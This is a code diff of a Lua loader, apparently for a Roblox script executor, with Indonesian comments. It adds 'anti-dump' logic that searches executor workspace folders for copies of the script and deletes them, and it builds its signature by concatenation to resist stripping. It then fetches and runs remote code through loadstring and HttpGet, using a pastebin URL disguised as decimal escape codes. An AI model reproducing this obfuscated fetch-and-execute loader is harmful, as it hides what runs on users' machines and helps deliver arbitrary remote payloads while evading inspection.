@@ -1,22 +1,75 @@
--- Embed this unique string in your protected script's source
-local UNIQUE_SIGNATURE = "MY_PROTECTED_SCRIPT_V3_A7F9B2E1"
+--[[
+    ANTI-DUMP PROTECTION
+    Signature: PROTC_7X9K2Q_LOADER
 
-local function deleteMatchingFiles()
-    local workspaceDir = "workspace" -- Default executor sandbox folder
-    local ok, files = pcall(listfiles, workspaceDir)
-    if not ok then return end
+    Jika file ini (atau salinannya) disimpan ke workspace executor oleh
+    tools deteksi/stealer, script ini akan otomatis menemukan dan
+    menghapusnya. Hanya file yang mengandung signature di atas yang
+    akan dihapus — file lain milik user tidak disentuh.
+]]
 
-    for _, filename in ipairs(files) do
-        -- Only process files (not folders)
-        if isfile(filename) then
-            local readOk, content = pcall(readfile, filename)
-            if readOk and content and content:find(UNIQUE_SIGNATURE, 1, true) then
-                -- This file contains your signature — delete it
-                pcall(delfile, filename)
+-- Signature dibangun dinamis (concat) supaya tidak mudah di-strip oleh
+-- tools yang sekadar menghapus string literal.
+local SIG = table.concat({ "PROTC", "_", "7X9K2Q", "_", "LOADER" })
+
+local WORKSPACES = { "workspace", ".", "/workspace" }
+
+local function log(tag, msg)
+    print(string.format("[PROTECT][%s] %s", tag, msg))
+end
+
+local function scanAndPurge()
+    log("PENCARIAN", "Memindai workspace untuk salinan script...")
+    local totalFound   = 0
+    local totalDeleted = 0
+
+    for _, dir in ipairs(WORKSPACES) do
+        local ok, files = pcall(listfiles, dir)
+        if ok and type(files) == "table" and #files > 0 then
+            for _, path in ipairs(files) do
+                local fOk, isF = pcall(isfile, path)
+                if fOk and isF then
+                    local rOk, content = pcall(readfile, path)
+                    if rOk and type(content) == "string"
+                       and content:find(SIG, 1, true) then
+                        totalFound = totalFound + 1
+                        log("TERDETEKSI", "Salinan ditemukan: " .. tostring(path))
+                        local dOk = pcall(delfile, path)
+                        if dOk then
+                            totalDeleted = totalDeleted + 1
+                            log("DIHAPUS", "Berhasil menghapus: " .. tostring(path))
+                        else
+                            log("GAGAL", "Tidak bisa menghapus: " .. tostring(path))
+                        end
+                    end
+                end
             end
+            -- sudah berhasil akses satu workspace, cukup
+            break
         end
+    end
+
+    if totalFound == 0 then
+        log("BERHASIL", "Tidak ada salinan terdeteksi. Workspace bersih.")
+    else
+        log("BERHASIL", string.format(
+            "%d file terdeteksi, %d berhasil dihapus.",
+            totalFound, totalDeleted))
     end
 end
 
--- Call this at the start of your script
-deleteMatchingFiles()
+-- 1) Jalankan proteksi
+scanAndPurge()
+
+-- 2) Eksekusi payload asli setelah workspace bersih / terverifikasi
+log("EKSEKUSI", "Menjalankan script utama...")
+
+local success, err = pcall(function()
+    loadstring(game:HttpGet(
+        "\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\88\107\78\113\82\68\70\118"
+    ))()
+end)
+
+if not success then
+    log("ERROR", tostring(err))
+end
